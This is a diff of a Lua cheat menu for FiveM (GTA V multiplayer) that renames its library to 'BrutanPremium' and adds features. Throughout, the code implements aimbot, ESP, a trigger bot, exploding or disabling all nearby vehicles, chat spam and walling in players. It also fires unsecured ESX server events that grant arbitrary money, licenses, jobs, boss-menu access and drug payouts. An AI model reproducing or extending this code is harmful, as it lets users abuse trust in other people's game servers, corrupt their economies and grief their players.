+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metal3") then
+                    for dS, dT in pairs(bj) do _, ts = GetVehicleExtraColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; _, currims = GetVehicleExtraColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false
+                     oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) 
+                     b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) 
+                     SetVehicleExtraColours(veh, oldpearl, dT.id) 
+                     b8 = true elseif b8 and currims == dT.id then 
+                        SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end;
+    
+                    BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("LSC") then
 			local veh = GetVehiclePedIsUsing(PlayerPedId())
-                if Plane.CheckBox(
+					if BrutanPremium.MenuButton('~r~→  ~s~~y~Handling ~s~editor', 'Hedit') then
+		elseif BrutanPremium.MenuButton("~r~→  ~s~~g~Performance ~s~Tuning", "performance") then
+        elseif BrutanPremium.MenuButton("~r~→  ~s~~b~Exterior ~s~Tuning", "tunings") then
+                elseif BrutanPremium.CheckBox(
                     "Super Handling",
                     superGrip,
                     function(enabled)
@@ -4642,7 +6491,7 @@ Citizen.CreateThread(
                         fdMode = false
                     end)
                 then
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                     "Enhanced Grip",
                     enchancedGrip,
                     function(enabled)
@@ -4652,7 +6501,7 @@ Citizen.CreateThread(
                         fdMode = false
                     end)
                 then
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                     "Drift Mode",
                     driftMode,
                     function(enabled)
@@ -4662,7 +6511,7 @@ Citizen.CreateThread(
                         fdMode = false
                     end)
                 then
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                     "Formula Drift Mode",
                     fdMode,
                     function(enabled)
@@ -4672,61 +6521,226 @@ Citizen.CreateThread(
                         fdMode = enabled
                     end)
                 then
-                elseif Plane.MenuButton("Vehicle Boost", "VehBoostMenu") then
-                elseif Plane.Button("Max Exterior Tuning") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Vehicle Boost", "VehBoostMenu") then
+                elseif BrutanPremium.Button("Max Exterior Tuning") then
                     MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
-                elseif Plane.Button("Max Performance") then
+                elseif BrutanPremium.Button("Max Performance") then
                     MaxOutPerf(GetVehiclePedIsUsing(PlayerPedId()))
                 end
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("VehBoostMenu") then
-                if Plane.Button('Engine Power boost reset') then
+                BrutanPremium.Display()
+		elseif BrutanPremium.IsMenuOpened("Hedit") then
+		if GetVehiclePedIsIn( PlayerPedId(), false ) ~= 0 then
+						if BrutanPremium.Button('Refresh Info') then
+                            chdata = GetAllVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(), false ) ) 
+							end
+			for i,theKey in pairs(chdata) do
+				if tonumber(theKey.value) then 
+					theKey.value = math.floor(tonumber(theKey.value) * 10^(3) + 0.5) / 10^(3)
+				end
+				if type(theKey.value) == "vector3" then
+					local v1,v2,v3 = table.unpack(theKey.value)
+					theKey.value = v1..","..v2..","..v3
+				end
+				theKey.value = tostring(theKey.value)
+				
+				if theKey.value and BrutanPremium.Button(theKey.name, theKey.value) then 
+						
+					
+						
+					AddTextEntry('FMMC_KEY_TIP12N', "Enter new "..theKey.name.." value :") 
+
+					DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP12N", "", theKey.value, "", "", "", 128 + 1)
+				
+					while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
+						Citizen.Wait( 0 )
+					end
+				
+					local result = GetOnscreenKeyboardResult()
+					if result then
+					
+						if theKey.type == "vector3" then
+							local x,y,z = table.unpack( mysplit( result, "," ) )
+							if x and y and z then
+								result = vector3(tonumber(x),tonumber(y),tonumber(z))
+							else
+								break
+							end
+						end
+						
+			
+								
+						SetVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(),false), theKey.name, result ) 
+						Wait(200)
+						chdata = GetAllVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(), false ) )
+					end
+					
+					
+				end
+			end
+        else
+		drawNotification("You're not sitting in a vehicle IDIOT!")
+			end
+		BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened('CarTypes') then
+                for i, ex in ipairs(b3) do
+                    if BrutanPremium.MenuButton('~r~→  ~s~' .. ex, 'CarTypeSelection') then
+                        carTypeIdx = i
+                    end
+                end
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened('CarTypeSelection') then
+                for i, ex in ipairs(b4[carTypeIdx]) do
+                    if BrutanPremium.MenuButton('~r~→  ~s~' .. ex, 'CarOptions') then
+                        carToSpawn = i
+                    end
+                end
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened('CarOptions') then
+                if BrutanPremium.Button('Spawn Infront Of You') then
+                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
+                    local veh = b4[carTypeIdx][carToSpawn]
+                    if veh == nil then
+                        veh = 'adder'
+                    end
+                    vehiclehash = GetHashKey(veh)
+                    RequestModel(vehiclehash)
+                    Citizen.CreateThread(
+                        function()
+                            local ey = 0
+                            while not HasModelLoaded(vehiclehash) do
+                                ey = ey + 100
+                                Citizen.Wait(100)
+                                if ey > 5000 then
+                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
+                                    break
+                                end
+                            end
+                            SpawnedCar =
+                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
+                            SetVehicleStrong(SpawnedCar, true)
+                            SetVehicleEngineOn(SpawnedCar, true, true, false)
+                            SetVehicleEngineCanDegrade(SpawnedCar, false)
+                        end
+                    )
+				elseif BrutanPremium.Button('Spawn In It') then
+                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
+                    local veh = b4[carTypeIdx][carToSpawn]
+                    if veh == nil then
+                        veh = 'adder'
+                    end
+                    vehiclehash = GetHashKey(veh)
+                    RequestModel(vehiclehash)
+                    Citizen.CreateThread(
+                        function()
+                            local ey = 0
+                            while not HasModelLoaded(vehiclehash) do
+                                ey = ey + 100
+                                Citizen.Wait(100)
+                                if ey > 5000 then
+                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
+                                    break
+                                end
+                            end
+                            SpawnedCar =
+                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
+                            SetVehicleStrong(SpawnedCar, true)
+							SetPedIntoVehicle(PlayerPedId(), SpawnedCar, -1)
+                            SetVehicleEngineOn(SpawnedCar, true, true, false)
+                            SetVehicleEngineCanDegrade(SpawnedCar, false)
+                        end
+                    )
+                end
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened('MainTrailer') then
+                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
+                    for i, ex in ipairs(b5) do
+                        if BrutanPremium.MenuButton('~r~→  ~s~' .. ex, 'MainTrailerSpa') then
+                            TrailerToSpawn = i
+                        end
+                    end
+                else
+                    av('~h~~w~Not in a vehicle', true)
+                end
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened('MainTrailerSpa') then
+                if BrutanPremium.Button('Spawn Vehicle') then
+                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
+                    local veh = b5[TrailerToSpawn]
+                    if veh == nil then
+                        veh = 'adder'
+                    end
+                    vehiclehash = GetHashKey(veh)
+                    RequestModel(vehiclehash)
+                    Citizen.CreateThread(
+                        function()
+                            local ey = 0
+                            while not HasModelLoaded(vehiclehash) do
+                                ey = ey + 100
+                                Citizen.Wait(100)
+                                if ey > 5000 then
+                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
+                                    break
+                                end
+                            end
+                            local SpawnedCar =
+                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
+                            local ez = GetVehiclePedIsUsing(GetPlayerPed(-1))
+                            AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0)
+                            SetVehicleStrong(SpawnedCar, true)
+                            SetVehicleEngineOn(SpawnedCar, true, true, false)
+                            SetVehicleEngineCanDegrade(SpawnedCar, false)
+                        end
+                    )
+                end
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("VehBoostMenu") then
+                if BrutanPremium.Button('Engine Power boost ~r~RESET') then
 				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
-			elseif Plane.Button('Engine Power boost ~g~x2') then
+			elseif BrutanPremium.Button('Engine Power boost ~g~x2') then
 					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
-			elseif Plane.Button('Engine Power boost  ~g~x4') then
+			elseif BrutanPremium.Button('Engine Power boost  ~g~x4') then
 				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
-			elseif Plane.Button('Engine Power boost  ~g~x8') then
+			elseif BrutanPremium.Button('Engine Power boost  ~g~x8') then
 				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
-			elseif Plane.Button('Engine Power boost  ~g~x16') then
+			elseif BrutanPremium.Button('Engine Power boost  ~g~x16') then
 				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
-			elseif Plane.Button('Engine Power boost  ~g~x32') then
+			elseif BrutanPremium.Button('Engine Power boost  ~g~x32') then
 				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
-			elseif Plane.Button('Engine Power boost  ~g~x64') then
+			elseif BrutanPremium.Button('Engine Power boost  ~g~x64') then
 				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
-			elseif Plane.Button('Engine Power boost  ~g~x128') then
+			elseif BrutanPremium.Button('Engine Power boost  ~g~x128') then
 				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
-			elseif Plane.Button('Engine Power boost  ~g~x256') then
-				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 256.0 * 20.0)
-			elseif Plane.Button('Engine Power boost  ~g~x512') then
+			elseif BrutanPremium.Button('Engine Power boost  ~g~x512') then
 				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
+			elseif BrutanPremium.Button('Engine Power boost  ~g~ULTIMATE') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5012.0 * 20.0)
 			end
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("MaliciousMenu") then
-                if Plane.CheckBox(
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("MaliciousMenu") then
+                if BrutanPremium.CheckBox(
                     "Crosshair",
                     crosshair,
                     function(enabled)
                         crosshair = enabled
                     end)
                 then
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                     "Crosshair 2",
                     crosshair2,
                     function(enabled)
                          crosshair2 = enabled
                     end)
                 then
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                     "Crosshair 3",
                     crosshair3,
                     function(enabled)
                         crosshair3 = enabled
                     end)
                 then
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                 "~o~Thermal Vision",
                 thermalVision,
                 function(enabled)
@@ -4734,28 +6748,98 @@ Citizen.CreateThread(
                     SetSeethrough(thermalVision)
                 end)
                 then
-                elseif Plane.CheckBox(
+				elseif BrutanPremium.CheckBox(
+                "~p~Night Vision",
+                nightVision,
+                function(enabled)
+                    nightVision = enabled
+                    SetNightvision(nightVision)
+                end)
+                then
+				elseif BrutanPremium.CheckBox(
+				    "Christmas Weather",
+					XMAS,
+					function(enabled)
+					XMAS = enabled
+					end)
+					then
+				elseif BrutanPremium.CheckBox(
+				    "Foggy Weather",
+					FOGGY,
+					function(enabled)
+					FOGGY = enabled
+					end)
+					then
+				elseif BrutanPremium.CheckBox(
+				    "Clear Weather",
+					CLEAR,
+					function(enabled)
+					CLEAR = enabled
+					end)
+					then
+				elseif BrutanPremium.CheckBox(
+				    "Blizzard Weather",
+					BLIZZARD,
+					function(enabled)
+					BLIZZARD = enabled
+					end)
+					then
+				elseif BrutanPremium.CheckBox(
+				    "Extra Sunny Weather",
+					EXTRASUNNY,
+					function(enabled)
+					EXTRASUNNY = enabled
+					end)
+					then
+				elseif BrutanPremium.Button("Time set to night") then
+				NetworkOverrideClockTime(23, 50, 0)
+				elseif BrutanPremium.Button("Time set to day") then
+				NetworkOverrideClockTime(12, 12, 0)
+				elseif BrutanPremium.Button("Wall-in Legion Square") then
+                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
+                    roundx = tonumber(string.format('%.2f', x))
+                    roundy = tonumber(string.format('%.2f', y))
+                    roundz = tonumber(string.format('%.2f', z))
+                    local e8 = -145066854
+                    RequestModel(e8)
+                    while not HasModelLoaded(e8) do
+                        Citizen.Wait(0)
+                    end
+                    local e9 = CreateObject(e8, 258.91, -933.1, 26.21, true, true, false)
+                    local ea = CreateObject(e8, 200.91, -874.1, 26.21, true, true, false)
+					local e92 = CreateObject(e8, 126.52, -933.2, 26.21, true, true, false)
+					local ea2 = CreateObject(e8, 184.52, -991.2, 26.21, true, true, false)
+                    SetEntityHeading(e9, 158.41)
+                    SetEntityHeading(ea, 90.51)
+					SetEntityHeading(e92, 332.41)
+                    SetEntityHeading(ea2, 260.51)
+                    FreezeEntityPosition(e9, true)
+                    FreezeEntityPosition(ea, true)
+					FreezeEntityPosition(e92, true)
+                    FreezeEntityPosition(ea2, true)
+                elseif BrutanPremium.CheckBox(
                     "AimBot",
-                    aimbot,
+                    LOJ38,
                     function(enabled)
-                        aimbot = enabled
+                        LOJ38 = enabled
                     end)
                 then
-                elseif Plane.CheckBox(
-                    "ESP",
-                    esp,
-                    function(enabled)
-                        esp = enabled
-                    end)
-                then
-				elseif Plane.CheckBox(
-				"~h~~r~Explode ~s~All Vehicles",
+                elseif BrutanPremium.MenuButton('~r~→  ~s~ESP Menu', 'LulxDJ') then
+				elseif BrutanPremium.CheckBox(
+				"~g~EMP ~s~All Nearby Vehicles",
+				destroyvehicles,
+				function(enabled)
+				destroyvehicles = enabled
+				end) 
+			then
+				elseif BrutanPremium.CheckBox(
+				"~r~Explode ~s~All Nearby Vehicles",
 				explodevehicles,
 				function(enabled)
 				explodevehicles = enabled
 				end) 
 			then
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                     "Trigger Bot",
                     TriggerBot,
                     function(enabled)
@@ -4763,31 +6847,70 @@ Citizen.CreateThread(
                     end)
                 then
 				 elseif
-                    Plane.CheckBox(
+                    BrutanPremium.CheckBox(
                         'Chat Spam',
                         chatspam,
                         function(enabled)
-                            chatspam = true
+                            chatspam = enabled
                         end
                     )
                  then
 
                 end
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("ESXMenu") then
-                if Plane.MenuButton("ESX Money Options", "ESXMoneyMenu") then
-                elseif Plane.MenuButton("ESX Job Menu", "ESXJobMenu") then
-                elseif Plane.MenuButton("ESX Boss", "ESXBossMenu") then
-                elseif Plane.MenuButton("ESX Drugs", "ESXDrugMenu") then
-                elseif Plane.MenuButton("ESX Misc", "ESXMiscMenu") then
+                BrutanPremium.Display()
+			elseif BrutanPremium.IsMenuOpened('LulxDJ') then
+                if
+                    BrutanPremium.CheckBox(
+                        '~h~~r~ESP ~s~MasterSwitch',
+                        esp,
+                        function(enabled)
+                            esp = enabled
+                        end
+                    )
+                 then
+                elseif
+                    BrutanPremium.CheckBox(
+                        '~h~~r~ESP ~s~Box',
+                        jfjfjffuhguh,
+                        function(enabled)
+                            jfjfjffuhguh = enabled
+                        end
+                    )
+                 then
+                elseif
+                    BrutanPremium.CheckBox(
+                        '~h~~r~ESP ~s~Info',
+                        KDOWJDw,
+                        function(enabled)
+                            KDOWJDw = enabled
+                        end
+                    )
+                 then
+                elseif
+                    BrutanPremium.CheckBox(
+                        '~h~~r~ESP ~s~Lines',
+                        jfjfjf,
+                        function(enabled)
+                            jfjfjf = enabled
+                        end
+                    )
+                 then
+                end
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("ESXMenu") then
+                if BrutanPremium.MenuButton("~r~→  ~s~ESX Money Options", "ESXMoneyMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Job Menu", "ESXJobMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Boss", "ESXBossMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Drugs", "ESXDrugMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Misc", "ESXMiscMenu") then
                 end
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("ESXMiscMenu") then
-                if Plane.Button("ESX Harvest FixKit") then
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("ESXMiscMenu") then
+                if BrutanPremium.Button("ESX Harvest FixKit") then
                     TriggerServerEvent("esx_mechanicjob:startHarvest")
-				elseif Plane.Button    ("ESX Get all licenses ") then
+				elseif BrutanPremium.Button    ("ESX Get all licenses ") then
 					TriggerServerEvent("dmv:success")
 					TriggerServerEvent('esx_weashopjob:addLicense', 'tazer')
 					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa')
@@ -4800,85 +6923,85 @@ Citizen.CreateThread(
 					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_truck')
 					TriggerServerEvent('esx_airlines:addLicense', 'helico')
 					TriggerServerEvent('esx_airlines:addLicense', 'avion')
-                elseif Plane.Button("ESX Craft FixKit") then
+                elseif BrutanPremium.Button("ESX Craft FixKit") then
                     TriggerServerEvent("esx_mechanicjob:startCraft")
                 end
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("ESXDrugMenu") then
-                if Plane.Button("Harvest Weed (x5)") then
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("ESXDrugMenu") then
+                if BrutanPremium.Button("Harvest Weed (x5)") then
                     TriggerServerEvent("esx_drugs:startHarvestWeed")
                     TriggerServerEvent("esx_drugs:startHarvestWeed")
                     TriggerServerEvent("esx_drugs:startHarvestWeed")
                     TriggerServerEvent("esx_drugs:startHarvestWeed")
                     TriggerServerEvent("esx_drugs:startHarvestWeed")
-                elseif Plane.Button("Transform Weed (x5)") then
+                elseif BrutanPremium.Button("Transform Weed (x5)") then
                     TriggerServerEvent("esx_drugs:startTransformWeed")
                     TriggerServerEvent("esx_drugs:startTransformWeed")
                     TriggerServerEvent("esx_drugs:startTransformWeed")
                     TriggerServerEvent("esx_drugs:startTransformWeed")
                     TriggerServerEvent("esx_drugs:startTransformWeed")
-                elseif Plane.Button("Sell Weed (x5)") then
+                elseif BrutanPremium.Button("Sell Weed (x5)") then
                     TriggerServerEvent("esx_drugs:startSellWeed")
                     TriggerServerEvent("esx_drugs:startSellWeed")
                     TriggerServerEvent("esx_drugs:startSellWeed")
                     TriggerServerEvent("esx_drugs:startSellWeed")
                     TriggerServerEvent("esx_drugs:startSellWeed")
-                elseif Plane.Button("Harvest Coke (x5)") then
+                elseif BrutanPremium.Button("Harvest Coke (x5)") then
                     TriggerServerEvent("esx_drugs:startHarvestCoke")
                     TriggerServerEvent("esx_drugs:startHarvestCoke")
                     TriggerServerEvent("esx_drugs:startHarvestCoke")
                     TriggerServerEvent("esx_drugs:startHarvestCoke")
                     TriggerServerEvent("esx_drugs:startHarvestCoke")
-                elseif Plane.Button("Transform Coke (x5)") then
+                elseif BrutanPremium.Button("Transform Coke (x5)") then
                     TriggerServerEvent("esx_drugs:startTransformCoke")
                     TriggerServerEvent("esx_drugs:startTransformCoke")
                     TriggerServerEvent("esx_drugs:startTransformCoke")
                     TriggerServerEvent("esx_drugs:startTransformCoke")
                     TriggerServerEvent("esx_drugs:startTransformCoke")
-                elseif Plane.Button("Sell Coke (x5)") then
+                elseif BrutanPremium.Button("Sell Coke (x5)") then
                     TriggerServerEvent("esx_drugs:startSellCoke")
                     TriggerServerEvent("esx_drugs:startSellCoke")
                     TriggerServerEvent("esx_drugs:startSellCoke")
                     TriggerServerEvent("esx_drugs:startSellCoke")
                     TriggerServerEvent("esx_drugs:startSellCoke")
-                elseif Plane.Button("Harvest Meth (x5)") then
+                elseif BrutanPremium.Button("Harvest Meth (x5)") then
                     TriggerServerEvent("esx_drugs:startHarvestMeth")
                     TriggerServerEvent("esx_drugs:startHarvestMeth")
                     TriggerServerEvent("esx_drugs:startHarvestMeth")
                     TriggerServerEvent("esx_drugs:startHarvestMeth")
                     TriggerServerEvent("esx_drugs:startHarvestMeth")
-                elseif Plane.Button("Transform Meth (x5)") then
+                elseif BrutanPremium.Button("Transform Meth (x5)") then
                     TriggerServerEvent("esx_drugs:startTransformMeth")
                     TriggerServerEvent("esx_drugs:startTransformMeth")
                     TriggerServerEvent("esx_drugs:startTransformMeth")
                     TriggerServerEvent("esx_drugs:startTransformMeth")
                     TriggerServerEvent("esx_drugs:startTransformMeth")
-                elseif Plane.Button("Sell Meth (x5)") then
+                elseif BrutanPremium.Button("Sell Meth (x5)") then
                     TriggerServerEvent("esx_drugs:startSellMeth")
                     TriggerServerEvent("esx_drugs:startSellMeth")
                     TriggerServerEvent("esx_drugs:startSellMeth")
                     TriggerServerEvent("esx_drugs:startSellMeth")
                     TriggerServerEvent("esx_drugs:startSellMeth")
-                elseif Plane.Button("Harvest Opium (x5)") then
+                elseif BrutanPremium.Button("Harvest Opium (x5)") then
                     TriggerServerEvent("esx_drugs:startHarvestOpium")
                     TriggerServerEvent("esx_drugs:startHarvestOpium")
                     TriggerServerEvent("esx_drugs:startHarvestOpium")
                     TriggerServerEvent("esx_drugs:startHarvestOpium")
                     TriggerServerEvent("esx_drugs:startHarvestOpium")
-                elseif Plane.Button("Transform Opium (x5)") then
+                elseif BrutanPremium.Button("Transform Opium (x5)") then
                     TriggerServerEvent("esx_drugs:startTransformOpium")
                     TriggerServerEvent("esx_drugs:startTransformOpium")
                     TriggerServerEvent("esx_drugs:startTransformOpium")
                     TriggerServerEvent("esx_drugs:startTransformOpium")
                     TriggerServerEvent("esx_drugs:startTransformOpium")
-                elseif Plane.Button("Sell Opium (x5)") then
+                elseif BrutanPremium.Button("Sell Opium (x5)") then
                     TriggerServerEvent("esx_drugs:startSellOpium")
                     TriggerServerEvent("esx_drugs:startSellOpium")
                     TriggerServerEvent("esx_drugs:startSellOpium")
                     TriggerServerEvent ("esx_drugs:startSellOpium")
                     TriggerServerEvent("esx_drugs:startSellOpium")
-                elseif Plane.Button("Money Wash (x10)") then
+                elseif BrutanPremium.Button("Money Wash (x10)") then
                     TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                     TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                     TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
@@ -4889,7 +7012,7 @@ Citizen.CreateThread(
                     TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                     TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                     TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
-                elseif Plane.Button("Stop all (Drugs)") then
+                elseif BrutanPremium.Button("Stop all (Drugs)") then
                     TriggerServerEvent("esx_drugs:stopHarvestCoke")
                     TriggerServerEvent("esx_drugs:stopTransformCoke")
                     TriggerServerEvent("esx_drugs:stopSellCoke")
@@ -4905,36 +7028,37 @@ Citizen.CreateThread(
                 end
 
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("ESXBossMenu") then
-                if Plane.Button("~c~Mechanic~w~ Boss Menu") then
+                BrutanPremium.Display()
+-- 4x482
+            elseif BrutanPremium.IsMenuOpened("ESXBossMenu") then
+                if BrutanPremium.Button("~c~Mechanic~w~ Boss Menu") then
 					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
 					setMenuVisible(currentMenu, false)
-				elseif Plane.Button("~b~Police~w~ Boss Menu") then
+				elseif BrutanPremium.Button("~b~Police~w~ Boss Menu") then
 					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
 					setMenuVisible(currentMenu, false)
-				elseif Plane.Button("~r~Ambulance~w~ Boss Menu") then
+				elseif BrutanPremium.Button("~r~Ambulance~w~ Boss Menu") then
 					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
 					setMenuVisible(currentMenu, false)
-				elseif Plane.Button("~y~Taxi~w~ Boss Menu") then
+				elseif BrutanPremium.Button("~y~Taxi~w~ Boss Menu") then
 					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
 					setMenuVisible(currentMenu, false)
-				elseif Plane.Button("~g~Real Estate~w~ Boss Menu") then
+				elseif BrutanPremium.Button("~g~Real Estate~w~ Boss Menu") then
 					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
 					setMenuVisible(currentMenu, false)
-				elseif Plane.Button("~p~Gang~w~ Boss Menu") then
+				elseif BrutanPremium.Button("~p~Gang~w~ Boss Menu") then
 					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
 					setMenuVisible(currentMenu, false)
-				elseif Plane.Button("~o~Car Dealer~w~ Boss Menu") then
+				elseif BrutanPremium.Button("~o~Car Dealer~w~ Boss Menu") then
 					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
 					setMenuVisible(currentMenu, false)
-				elseif Plane.Button("~y~Banker~w~ Boss Menu") then
+				elseif BrutanPremium.Button("~y~Banker~w~ Boss Menu") then
 					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
 					setMenuVisible(currentMenu, false)
-				elseif Plane.Button("~c~Mafia~w~ Boss Menu") then
+				elseif BrutanPremium.Button("~c~Mafia~w~ Boss Menu") then
 					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
 					setMenuVisible(currentMenu, false)
-				elseif Plane.Button("~g~ESX ~y~Custom Boss Menu") then
+				elseif BrutanPremium.Button("~g~ESX ~y~Custom Boss Menu") then
 					local result = KeyboardInput("Enter Boss Menu Script Name", "", 10)
 					if result then
 						TriggerEvent('esx_society:openBossMenu', result, function(data,menu) menu.close() end)
@@ -4942,27 +7066,27 @@ Citizen.CreateThread(
 					end
 				end
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("ESXJobMenu") then
-                if Plane.Button("Unemployed") then
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("ESXJobMenu") then
+                if BrutanPremium.Button("Unemployed") then
                     TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(-1))
-                elseif Plane.Button("Police") then
+                elseif BrutanPremium.Button("Police") then
                     TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"police",3)
-                elseif Plane.Button("Mechanic") then
+                elseif BrutanPremium.Button("Mechanic") then
                     TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"mecano",3)
-                elseif Plane.Button("Taxi") then
+                elseif BrutanPremium.Button("Taxi") then
                     TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"taxi",3)
-                elseif Plane.Button("Ambulance") then
+                elseif BrutanPremium.Button("Ambulance") then
                     TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"ambulance",3)
-                elseif Plane.Button("Real Estate Agent") then
+                elseif BrutanPremium.Button("Real Estate Agent") then
                     TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"realestateagent",3)
-                elseif Plane.Button("Car Dealer") then
+                elseif BrutanPremium.Button("Car Dealer") then
                     TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"cardealer",3)
                 end
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("ESXMoneyMenu") then
-                if Plane.Button("-» Ultimate moneymaker «-") then
+                BrutanPremium.Display()
+                        elseif BrutanPremium.IsMenuOpened("ESXMoneyMenu") then
+                if BrutanPremium.Button("-» Ultimate moneymaker «-") then
 				local result = KeyboardInput("Enter amount of money", "", 100000000)
 				if result then
 				TriggerServerEvent('esx_truckerjob:pay', result)
@@ -4984,71 +7108,73 @@ Citizen.CreateThread(
 				TriggerServerEvent('esx_moneywash:withdraw', result)
 				TriggerServerEvent('esx_moneywash:deposit', result)
 			    TriggerServerEvent('mission:completed', result)
